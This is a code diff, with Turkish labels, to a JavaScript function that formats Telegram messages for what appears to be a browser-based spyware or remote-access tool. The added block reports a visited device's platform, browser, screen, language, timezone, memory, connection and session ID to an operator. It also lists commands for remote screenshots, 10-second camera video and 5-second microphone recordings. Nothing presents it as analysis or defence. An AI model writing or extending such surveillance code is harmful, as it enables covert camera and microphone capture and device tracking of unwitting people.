@@ -89,13 +89,48 @@ function formatTelegramMessage(logData, ip) {
         'command_received': '📡 KOMUT ALINDI',
         'command_error': '⚠️ KOMUT HATASI',
         'device_info': '📱 AKTİF CİHAZ BİLGİSİ',
-        'help_guide': '📖 KULLANIM KILAVUZU'
+        'help_guide': '📖 KULLANIM KILAVUZU',
+        'active_device_card': '📱 AKTİF CİHAZ'
     };
 
     const title = eventIcons[event_type] || '🔔 YENİ OLAY';
 
     let message = `${title}\n`;
     message += `━━━━━━━━━━━━━━━━\n`;
+
+    // Active device card için özel format
+    if (event_type === 'active_device_card' && additional_data) {
+        const emoji = additional_data.emoji || '📱';
+        message = `${emoji} <b>AKTİF CİHAZ</b>\n`;
+        message += `━━━━━━━━━━━━━━━━\n\n`;
+        
+        message += `<b>🖥️ Platform:</b> ${additional_data.platform || 'Unknown'}\n`;
+        message += `<b>🌐 Tarayıcı:</b> ${additional_data.browser || 'Unknown'}\n`;
+        message += `<b>📺 Ekran:</b> ${additional_data.screen || 'Unknown'}\n`;
+        message += `<b>🌍 Dil:</b> ${additional_data.language || 'Unknown'}\n`;
+        message += `<b>🕐 Zaman Dilimi:</b> ${additional_data.timezone || 'Unknown'}\n`;
+        
+        if (additional_data.memory && additional_data.memory !== 'Unknown') {
+            message += `<b>💾 Bellek:</b> ${additional_data.memory}GB\n`;
+        }
+        
+        if (additional_data.connection && additional_data.connection !== 'Unknown') {
+            message += `<b>📡 Bağlantı:</b> ${additional_data.connection}\n`;
+        }
+        
+        message += `<b>${additional_data.online === 'Online' ? '🟢' : '🔴'} Durum:</b> ${additional_data.online || 'Unknown'}\n\n`;
+        
+        message += `<code>Session: ${additional_data.session_id || 'unknown'}</code>\n\n`;
+        
+        message += `━━━━━━━━━━━━━━━━\n`;
+        message += `💡 <b>Komutlar:</b>\n`;
+        message += `• <code>/camss</code> - Screenshot al\n`;
+        message += `• <code>/camrec10</code> - 10s video\n`;
+        message += `• <code>/micrec5</code> - 5s ses\n`;
+        message += `• <code>/help</code> - Tüm komutlar`;
+        
+        return message;
+    }
 
     // Help guide için özel format
     if (event_type === 'help_guide') {
